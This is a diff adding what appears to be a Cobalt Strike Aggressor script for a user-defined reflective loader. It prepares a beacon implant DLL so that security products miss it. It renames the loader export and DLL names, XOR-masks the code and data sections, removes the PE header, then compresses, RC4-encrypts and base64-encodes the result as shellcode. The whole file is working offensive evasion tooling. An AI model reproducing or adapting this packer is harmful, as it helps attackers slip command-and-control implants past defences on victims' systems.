@@ -1,0 +1,350 @@
+include(getFileProper(script_resource("lznt1.cna")));
+
+import java.awt.BorderLayout;
+import javax.crypto.*;
+import javax.crypto.spec.*; 
+import java.lang.*;
+import java.security.*;
+import javax.swing.*;
+
+
+# ===========================================================================
+#                                  Utils
+# ===========================================================================
+
+# ----------------------------------------------
+# Print information to the Script Console
+# $1 = message
+# ----------------------------------------------
+sub print_info {
+   println(formatDate("[HH:mm:ss] ") . "\cE[UDRL-VS]\o " . $1);
+}
+
+# ----------------------------------------------
+# Print Error to the Script Console
+# $1 = message
+# ----------------------------------------------
+sub print_error {
+   println(formatDate("[HH:mm:ss] ") . "\c4[UDRL-VS]\o " . $1);
+}
+
+# ----------------------------------------------
+# Normalize two strings to lower case and compare them
+# $1 = string to compare
+# $2 = string to compare
+# $return = a value based on comparison
+# ----------------------------------------------
+sub case_insensitive_compare {
+   return lc($1) cmp lc($2);
+}
+
+# ------------------------------------
+# Generate an array of random bytes
+# $1 = size of required byte array
+# return = a byte array of the required size
+# ------------------------------------
+sub generate_random_bytes {
+    local('$i @bytes');
+    @bytes = @();
+    for ($i = 0; $i < $1; $i++) {
+        push(@bytes, chr(rand(255)));
+    }
+    return join('', @bytes);
+}
+
+# ------------------------------------
+# Print the elements of a pemap
+# $1 = PE header information
+# ------------------------------------
+sub print_pe_info {
+   local('$out $key $val %pe_header_map @sorted_keys');
+
+   %pe_header_map = $1;
+   @sorted_keys = sort(&case_insensitive_compare, keys(%pe_header_map));
+   foreach $key (@sorted_keys)
+   {
+      $out = "$[50]key";
+      foreach $val (values(%pe_header_map, @($key)))
+      {
+         $out .= " $val";
+         println($out);
+      }
+   }
+}
+
+# ------------------------------------
+# A wrapper around strrep to pad the new string prior to replacing it.
+# $1 = input dll
+# $2 = original string
+# $3 = new string
+# return = the modified byte sequence
+# ------------------------------------
+sub strrep_pad {
+    local('$difference $input_dll $new_byte_sequence $new_byte_sequence_length $new_byte_sequence_padded $original_byte_sequence $original_byte_sequence_length $padding %pe_header_map');
+    $input_dll = $1;
+    $original_byte_sequence = $2;
+    $new_byte_sequence = $3;
+
+    $original_byte_sequence_length = strlen($original_byte_sequence);
+    $new_byte_sequence_length = strlen($new_byte_sequence);
+
+    if($new_byte_sequence_length > $original_byte_sequence_length) {
+        warn("strrep: input string is too large. exiting .. ");
+        return $null;
+    } 
+
+    $difference = $original_byte_sequence_length - $new_byte_sequence_length;
+
+    if ($difference != 0) {
+        $padding = "\x00" x $difference;
+        $new_byte_sequence_padded = $new_byte_sequence . $padding;
+    }
+    
+    return strrep($input_dll, $original_byte_sequence, $new_byte_sequence_padded);
+}
+
+# ------------------------------------
+# A function to create a progress bar for the LZNT1 compression
+# return = a closure that is used to set the current progress bar level
+# ------------------------------------
+sub create_compress_dialog {
+    local('$frame $panel $label $bar');
+    $frame = [new JFrame: "UDRL"];
+    $panel = [new JPanel];
+
+    [$frame setLocationRelativeTo: $null];
+    [$frame setDefaultCloseOperation: [JFrame DISPOSE_ON_CLOSE]];
+    [$frame setSize: 220, 100];
+    [$frame setContentPane: $panel];
+
+    $label = [new JLabel: "Compressing..."];
+    [$panel add: [BorderLayout NORTH], $label];
+
+    $bar = [new JProgressBar: 0, 100];
+    [$panel add: [BorderLayout CENTER], $bar];
+
+    [$frame show];
+
+    return lambda({
+        [$bar setValue: $1];
+        if ($1 >= 100) {
+            [$frame dispose];
+        }
+    }, $frame => $frame, $bar => $bar);
+} 
+
+# ===========================================================================
+#                                    Obfuscate 
+# ===========================================================================
+
+# ------------------------------------
+# XOR the specified section
+# $1 = input dll
+# $2 = target PE's header information
+# $3 = the XOR key (as a string)
+# $4 = the target section name
+# $return = the modified dll
+# ------------------------------------
+sub mask_section {
+    local('$key_string $key_length $masked_section $input_dll $section_start_address $section_size $section_name @key_bytes @masked_bytes %pe_header_map');
+    
+    $input_dll = $1;
+    %pe_header_map = $2;
+    $key_string = $3;
+    $key_length = strlen($key_string);
+    $section_name = $4;
+
+    @key_bytes = map({return asc($1);}, split('', $key_string));
+
+    $section_start_address = %pe_header_map[$section_name.".PointerToRawData.<value>"];
+    $section_size = %pe_header_map[$section_name.".SizeOfRawData.<value>"];
+
+    @masked_bytes = @();
+    $count = 0;
+    for($i = $section_start_address; $i < $section_start_address + $section_size; $i++) {
+        $modulus = $count % $key_length;
+        push(@masked_bytes, chr(byteAt($input_dll, $i) ^ @key_bytes[$modulus]));
+        $count++;
+    }
+    $masked_section = join('', @masked_bytes);
+    return replaceAt($input_dll, $masked_section, $section_start_address);
+}
+
+# ------------------------------------
+# Identify key loader values and create custom PE header structure
+# $1 = PE header information
+# $2 = array of XOR keys
+# $return = the 'packed' header structure
+# ------------------------------------
+sub create_custom_header_structure {
+    local('$pack_string $pe_file $Key_0_length $Key_1_length $Key_2_length $xor_key_lengths @xor_keys @xor_key_lengths %pe_header_map');
+
+    %pe_header_map = $1;
+    @xor_keys = $2;
+
+    $image_info = pack(
+        "I-I-I-l-", 
+        %pe_header_map["SizeOfImage.<value>"],
+        %pe_header_map["SizeOfHeaders.<value>"],
+        %pe_header_map["AddressOfEntryPoint.<value>"],
+        long(%pe_header_map["ImageBase.<value>"])
+    );
+
+    $text_section = pack(
+        "I-I-I-", 
+        %pe_header_map[".text.VirtualAddress.<value>"],
+        %pe_header_map[".text.PointerToRawData.<value>"], 
+        %pe_header_map[".text.SizeOfRawData.<value>"]
+    );
+
+    $rdata_section = pack(
+        "I-I-I-", 
+        %pe_header_map[".rdata.VirtualAddress.<value>"],
+        %pe_header_map[".rdata.PointerToRawData.<value>"], 
+        %pe_header_map[".rdata.SizeOfRawData.<value>"]
+    );
+
+    $data_section = pack(
+        "I-I-I-", 
+        %pe_header_map[".data.VirtualAddress.<value>"],
+        %pe_header_map[".data.PointerToRawData.<value>"], 
+        %pe_header_map[".data.SizeOfRawData.<value>"]
+    );
+
+    $pdata_section = pack(
+        "I-I-I-", 
+        %pe_header_map[".pdata.VirtualAddress.<value>"],
+        %pe_header_map[".pdata.PointerToRawData.<value>"], 
+        %pe_header_map[".pdata.SizeOfRawData.<value>"]
+    );
+
+    $reloc_section = pack(
+        "I-I-I-", 
+        %pe_header_map[".reloc.VirtualAddress.<value>"],
+        %pe_header_map[".reloc.PointerToRawData.<value>"], 
+        %pe_header_map[".reloc.SizeOfRawData.<value>"]
+    );
+
+    $data_directory_info = pack(
+        "I-I-I-I-", 
+        %pe_header_map["DataDirectory.0.VirtualAddress.<value>"],
+        %pe_header_map["DataDirectory.1.VirtualAddress.<value>"], 
+        %pe_header_map["DataDirectory.5.VirtualAddress.<value>"],
+        %pe_header_map[".reloc.VirtualSize.<value>"]
+    );
+    
+    @xor_key_lengths = map({return strlen($1);}, @xor_keys);
+    $xor_key_lengths = pack(
+        "I-I-I-",
+        @xor_key_lengths[0], 
+        @xor_key_lengths[1],
+        @xor_key_lengths[2]);
+ 
+    $custom_pe_structure = 
+        $image_info    .
+        $text_section  .
+        $rdata_section .
+        $data_section  .
+        $pdata_section .
+        $reloc_section .
+        $data_directory_info .
+        $xor_key_lengths     .
+        @xor_keys[0] .
+        @xor_keys[1] .
+        @xor_keys[2];
+
+    return $custom_pe_structure;
+}
+
+# ------------------------------------
+# RC4 encrypt the provided buffer
+# $1 = Plaintext buffer
+# $2 = PE header information
+# $3 = Encryption Key
+# $return = the modified PE file
+# ------------------------------------
+sub rc4_encrypt {
+    # referenced https://gist.github.com/CCob/9dd8de00c2c6ad069301a225589223fa by CCob (_EthicalChaos_)
+    local('$cipher $encrypted_buffer $encryption_key $key $plaintext_buffer');
+    $plaintext_buffer = $1;
+    $encryption_key = $2;
+
+    $cipher = [Cipher getInstance: "RC4"];
+    $key = [new SecretKeySpec: $encryption_key, "RC4"];
+    [$cipher init: [Cipher ENCRYPT_MODE], $key];
+    $encrypted_buffer = [$cipher doFinal: $plaintext_buffer];
+    
+    return $encrypted_buffer;
+}
+
+# ------------------------------------
+# $1 = DLL file name
+# $2 = Input dll
+# $3 = Architecture
+# $return = the modified dll
+# ------------------------------------
+sub obfuscate {
+    local('$arch $compressed_buffer $encrypted_buffer $input_dll $udrl_header_data $rc4_key $status $pack_string @xor_keys %pe_header_map');
+    $input_dll = $1;
+    $arch = $2;
+
+    # parse the input Dll
+    %pe_header_map = pedump($input_dll);
+    
+    # print the pemap
+    #print_pe_info(%pe_header_map);
+
+    # modify the exported module/function name
+    if($arch eq "x64") {
+        $input_dll = strrep_pad($input_dll, "ReflectiveLoader", "customLoader");
+        $input_dll = strrep_pad($input_dll, "beacon.x64.dll", "udrl.x64.dll");
+    } else {
+        $input_dll = strrep_pad($input_dll, "_ReflectiveLoader@4", "_customLoader@4");
+        $input_dll = strrep_pad($input_dll, "beacon.dll", "udrl.dll");
+    }
+
+    # mask the dll's .text, .rdata and .data sections with unique keys
+    @xor_keys[0] = generate_random_bytes(5);
+    @xor_keys[1] = generate_random_bytes(7);
+    @xor_keys[2] = generate_random_bytes(9);
+    $input_dll = mask_section($input_dll, %pe_header_map, @xor_keys[0], ".text");
+    $input_dll = mask_section($input_dll, %pe_header_map, @xor_keys[1], ".rdata");
+    $input_dll = mask_section($input_dll, %pe_header_map, @xor_keys[2], ".data");
+
+    # replace the dll's PE header with custom structure
+    $pe_header_data  = create_custom_header_structure(%pe_header_map, @xor_keys);
+    
+    # remove the dll's original PE header 
+    $size_of_original_pe_header = %pe_header_map["SizeOfHeaders.<value>"];
+    $input_dll_pe_sections = substr($input_dll, $size_of_original_pe_header);
+
+    # compress the dll
+    $status = create_compress_dialog();
+    $compressed_buffer = lznt1_compress($pe_header_data . $input_dll_pe_sections, $status);
+ 
+    # determine key values for our loader
+    $rc4_key_length = 11;
+    $rc4_key = generate_random_bytes($rc4_key_length);
+    $raw_file_size = strlen($input_dll);
+    $loaded_image_size = %pe_header_map["SizeOfImage.<value>"];
+    $compressed_file_size = strlen($compressed_buffer);
+
+    # rc4 encrypt shellcode
+    $encrypted_buffer = rc4_encrypt($compressed_buffer, $rc4_key);
+
+    # base64_encode shellcode
+    $b64_encoded_dll = base64_encode($encrypted_buffer);
+    $b64_file_size = strlen($b64_encoded_dll);
+
+    $udrl_header_data = pack(
+        "I-I-I-I-I-",
+        $b64_file_size,
+        $compressed_file_size,
+        $raw_file_size,
+        $loaded_image_size,
+        $rc4_key_length,
+    );
+    
+    # output the masked/compressed/encrypted/encoded shellcode
+    return $udrl_header_data . $rc4_key . $b64_encoded_dll;
+}
